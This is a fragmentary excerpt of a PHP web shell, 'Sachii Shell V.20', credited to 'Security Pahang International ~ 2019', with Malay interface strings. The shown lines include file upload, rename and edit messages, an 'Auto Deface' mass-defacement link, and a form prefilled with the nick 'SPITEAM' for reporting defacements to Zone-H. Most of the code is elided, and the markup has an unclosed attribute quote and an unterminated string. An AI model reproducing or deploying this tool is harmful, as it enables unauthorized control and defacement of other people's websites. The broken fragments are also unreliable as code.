...
<h1><center><img src="https://i.udemycdn.com/course/750x422/282412_d005_2.jpg" height="350 width="350"><font color="white" face=""><div class="lazy">Sachii Shell V.20</font></center></h1>
...
echo '<font color="aqua">Berjaya Upload!!!</font><br />';
...
echo "[ <a href='?dir=$dir&to=mass'>Auto Deface</a> ]";
...
if($_GET['to'] == 'zoneh') {
	...
	if($_POST['submit']) {
		...
		<input type='text' name='nick' size='50' value='SPITEAM'><br>
...
echo '<font color="aqua">Edit Nama Berjaya</font><br/>';

}else{

echo '<font color="red">Edit Faild Name</font><br />';
...
echo '<font color="aqua">Berjaya Edit File</font><br/>';
...
echo '<center><br/>Security Pahang International ~ 2019</center>
